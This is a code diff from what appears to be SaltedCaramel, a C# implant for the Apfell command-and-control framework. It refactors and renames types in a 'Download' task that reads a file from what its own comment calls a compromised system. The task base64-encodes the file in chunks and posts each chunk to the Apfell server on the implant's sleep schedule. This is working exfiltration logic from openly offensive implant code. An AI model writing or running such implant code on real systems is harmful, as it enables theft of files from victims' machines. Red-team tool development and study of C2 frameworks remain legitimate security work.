@@ -4,11 +4,14 @@ using System.Diagnostics;
 using System.IO;
 using System.Threading;
 
+/// <summary>
+/// This task will download a file from a compromised system to the Apfell server
+/// </summary>
 namespace SaltedCaramel.Tasks
 {
     internal class Download
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             string filepath = task.@params;
             try // Try block for file upload task
@@ -27,8 +30,8 @@ namespace SaltedCaramel.Tasks
 
                 // Send number of chunks associated with task to Apfell server
                 // Response will have the file ID to send file with
-                TaskResponse initial = new TaskResponse("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}", task.id);
-                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
+                SCTaskResp initial = new SCTaskResp("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}", task.id);
+                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.SCPostResp(initial));
                 Debug.WriteLine($"[-] Download - Received reply, file ID: " + reply.file_id);
 
 
@@ -66,9 +69,9 @@ namespace SaltedCaramel.Tasks
                     fc.chunk_data = Convert.ToBase64String(chunk);
 
                     // Send our FileChunk to Apfell server
-                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fc), task.id);
+                    SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fc), task.id);
                     Debug.WriteLine($"[+] Download - CHUNK SENT: {fc.chunk_num}");
-                    Debug.WriteLine($"[-] Download - RESPONSE: {implant.PostResponse(response)}");
+                    Debug.WriteLine($"[-] Download - RESPONSE: {implant.SCPostResp(response)}");
                     // Make sure we respect the sleep setting
                     Thread.Sleep(implant.sleep);
                 }
